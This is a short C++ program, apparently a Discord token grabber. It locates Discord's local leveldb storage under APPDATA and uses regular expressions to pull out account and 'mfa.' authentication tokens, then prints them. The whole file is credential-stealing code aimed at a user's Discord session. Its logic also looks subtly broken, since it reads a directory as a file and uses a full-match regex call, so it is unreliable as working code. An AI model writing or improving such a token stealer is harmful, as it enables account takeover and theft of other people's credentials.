#include <cstdlib>
#include <string>
#include <filesystem>
#include <regex>
#include <iostream>
#include <optional>
#include <fstream>

std::optional<std::filesystem::path> getPath() {
	auto appDataPathCharPtr = std::getenv("APPDATA");
	if (appDataPathCharPtr == NULL) {
		return std::nullopt;
	}
	std::string appDataPath(appDataPathCharPtr);
	std::string levelDBPath = "Discord/Local Storage/leveldb";
	std::filesystem::path path(appDataPath);
	path.append(levelDBPath);
	return path;
}

std::optional<std::string> loadLevelDB(std::filesystem::path path) {
	std::ifstream ifs(path);
	std::string ldb = std::string(std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>());

	if (!ldb.size()) {
		return std::nullopt;
	}

	return ldb;
}

int main() {
	auto pathOptional = getPath();
	if (!pathOptional) {
		return 1;
	}

	auto path = pathOptional.value();

	auto ldbOptional = loadLevelDB(path);
	if (!ldbOptional) {
		return 1;
	}

	auto ldb = ldbOptional.value();

	std::smatch m;
	std::regex r1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
	std::regex r2("mfa\\.[\\w-]{84}");

	if (std::regex_match(ldb, m, r1)) {
		std::cout << m.str() << std::endl;
		return 0;
	}

	if (std::regex_match(ldb, m, r2)) {
		std::cout << m.str() << std::endl;
		return 0;
	}

	return 1;
}
